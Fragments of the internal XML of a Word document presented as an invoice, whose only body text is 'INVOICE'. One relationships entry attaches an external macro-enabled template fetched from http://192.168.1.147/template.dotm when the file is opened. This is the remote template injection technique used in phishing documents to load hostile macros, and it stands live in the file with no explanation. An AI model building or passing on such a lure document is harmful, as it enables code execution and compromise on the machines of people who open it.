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3BB1" w14:textId="5CAA7F82" w:rsidR="001822DB" w:rsidRDefault="006D14AB">
      <w:r>
        <w:t>INVOICE</w:t>
      </w:r>
    </w:p>
    <w:sectPr w:rsidR="00182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4A"/>
    <w:rsid w:val="0062624A"/>
    <w:rsid w:val="00A15F3B"/>
    <w:rsid w:val="00C9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A11E"/>
  <w15:chartTrackingRefBased/>
  <w15:docId w15:val="{6EA63480-5701-44D1-B3D7-DEAA7550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4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4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4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4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4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4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4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
<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">
  <Relationship Id="rId1"
                Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate"
                Target="http://192.168.1.147/template.dotm"
                TargetMode="External"/>
</Relationships>
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simoncaio</dc:creator>
  <cp:keywords/>
  <dc:description/>
  <cp:lastModifiedBy>simoncaio</cp:lastModifiedBy>
  <cp:revision>1</cp:revision>
  <dcterms:created xsi:type="dcterms:W3CDTF">2026-04-24T19:02:00Z</dcterms:created>
  <dcterms:modified xsi:type="dcterms:W3CDTF">2026-04-24T19:02:00Z</dcterms:modified>
</cp:coreProperties>
</file>